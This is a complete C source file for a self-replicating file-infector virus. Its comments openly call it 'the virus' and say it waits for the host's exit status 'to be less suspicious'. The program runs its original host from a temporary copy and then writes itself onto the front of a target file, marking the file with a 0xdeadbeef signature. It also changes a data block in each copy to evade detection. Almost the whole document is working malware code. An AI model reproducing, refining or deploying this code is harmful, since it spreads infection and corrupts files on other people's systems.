#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define DATA_SIZE 32

int filesize = 14528;

unsigned char data[DATA_SIZE] = { 1, 2, 3, 4, 5, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 };

struct stat st;

int main(int argc, char *const * argv)
{
    unsigned char* buffer = malloc(4096);
    int tmp_existed = 0;
    /*if(stat("/tmp", &st) == -1)
    {
        tmp_existed = 0;
        int worked = mkdir("/tmp", 0755);
        printf("Worked: %d\n", worked);
    }*/

    // Run the original program first.

    // Make the directory
    mkdir("./tmp", 0755);

    // Open the file for reading in that directory.
    sprintf(buffer, "./tmp/%s", &argv[0][2]);
    

    int fdo = open(buffer, O_RDWR | O_CREAT | O_TRUNC, 0755);

    int fdt = open(argv[0], O_RDONLY);

    // Seek to the end of this file.
    lseek(fdt, filesize + 4, SEEK_SET);

    int read_bytes = read(fdt, buffer, 4096);
    
    do
    {
        int written = write(fdo, buffer, read_bytes);
        read_bytes = read(fdt, buffer, 4096);
    } while(read_bytes > 0);

    close(fdo);
    close(fdt);

    sprintf(buffer, "./tmp/%s", &argv[0][2]);

    if(fork() == 0)
    {
        execvp(buffer, argv);
        exit(0);
    }

    // Get the return value from the process to be less suspicious.
    int return_status = 0;
    wait(NULL);

    remove(buffer);

    if(!tmp_existed)
    {
        rmdir("./tmp");
    }

    if(argc < 2)
    {
        return 0;
    }


    //Verify file is not executable

    if(access(argv[1], X_OK) == 0)
    {
        return return_status;
    }

    fdo = open(argv[1], O_RDWR);
    fstat(fdo, &st);

    fdt = open(argv[0], O_RDONLY);

    

    unsigned char* output = mmap(NULL, st.st_size + filesize + 4, PROT_READ | PROT_WRITE, MAP_SHARED, fdo, 0);

    if(output == MAP_FAILED)
    {
        return -1;
    }

    if(output[filesize] == 0xde && output[filesize+1] == 0xad && output[filesize+2] == 0xbe && output[filesize+3] == 0xef)
    {
        munmap(output, st.st_size);
        close(fdt);
        close(fdo);
        return return_status;
    }
    else
    {
        if(ftruncate(fdo, st.st_size + filesize + 4) != 0)
        {
            munmap(output, st.st_size);
            close(fdt);
            close(fdo);
            return return_status;
        }
    }

    // Make space for the virus.
    for(int i = st.st_size - 1; i >= 0; i--)
    {
        output[i + filesize + 4] = output[i];
    }


    // Copy the virus to the file.
    read_bytes = read(fdt, buffer, 4096);
    int pos = 0;
    
    do
    {
        for(int i = pos; i < filesize + 4 && i - pos < read_bytes; i++)
        {
            output[i] = buffer[i - pos];
        }
        pos += read_bytes;
        read_bytes = read(fdt, buffer, 4096);
    } while(read_bytes > 0 && pos < filesize + 4);

    
    // Mutate!
    int j = 0;
    for(int i = 0; i < filesize; i++)
    {
        for(j = 0; j < DATA_SIZE; j++)
        {
            if(output[j + i] != data[j])
            {
                break;
            }
        }
        if(j == DATA_SIZE)
        {
            j = 0;
            output[i + (DATA_SIZE - 1)] += 1;
            for(j = i + (DATA_SIZE - 1); j > i; j--)
            {
                if(output[j] == 0)
                {
                    output[j - 1] += 1;
                    break;
                }
            }
        }
    }

    munmap(output, st.st_size + filesize + 4);
    close(fdt);
    close(fdo);

    return return_status;
}
